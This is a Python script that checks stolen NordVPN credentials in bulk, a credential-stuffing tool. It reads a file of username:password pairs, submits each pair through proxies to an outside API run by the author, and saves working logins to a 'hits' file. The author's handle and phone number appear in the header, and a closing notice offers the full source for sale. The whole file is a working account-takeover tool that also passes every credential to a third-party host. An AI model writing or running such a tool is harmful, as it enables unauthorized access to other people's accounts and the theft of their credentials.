# <coded by @josifkhan>
# WHATSAPP: +8801868608046
# -----------------------------------------------
import requests,sys,os
# colors
rd  = "\033[1;31m"
yl  = "\033[1;33m"
grn = "\033[1;32m"
en  = "\033[0m"
ok  = [0]
tts = [0]
xa  = []
# ----------------------------------------------
class NORDVPN:
	def __init__(self):
		os.system("cls")
	def login(selfy,user,password,proxy_url):
		sys.stdout.write(f"\r⬛CHECKING]: {len(xa)}/{grn}{ok[0]}{en}/{tts[0]}")
		with requests.Session() as session:
			url = "https://nordvpn.josiftools.com/nordlogin"
			params = {
				"user": user,
				"pass": password,
				"proxies": proxy_url,
			}
			try:
				response = session.get(url, params=params, timeout=10);xa.append('a')
				return response.json()
			except Exception as e:print("Error:", e);return {"message":"Error","status":"badd"}
	def main(self):
		with open(input(f"⬛{rd}Enter filename{en}: "),"r") as f:accounts=f.readlines();tts[0]=len(accounts)
		print("-"*60)
		for account in accounts:
			user     = account.split(":")[0].strip()
			password = account.split(":")[1].strip()
			proxy_url= "http://username:password@host:port"
			response = self.login(user=user,password=password,proxy_url=proxy_url)
			if response['status']=='no':
				print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')
			elif response['status']=='ok':
				print(f'\r⬛{grn}{user}:{password}{en}=>{yl}{response["message"]}{en}')
				ok[0] = '1'
				with open("hits_ok.txt","a") as f2:f2.write(f"{user}:{password}\n")
			else:print(f'\r⬛{rd}{user}:{password}{en}=>{yl}{response["message"]}{en}')

# -----------------------------------------------------------------------
email     = "user_email@josiftools.com"
password  = "user_pass"
proxy_url = "http://username:password@host:port" # http or socks5
# -----------------------------------------------------------------------
nd = NORDVPN()
nd.main()
# -----------------------------------------------------------------------
# ✅NOTICE: THIS API HAS LIMIT, IF U R INTERESTED IN ACTUAL SOURCE CODE YOU CAN CONTACT ME.

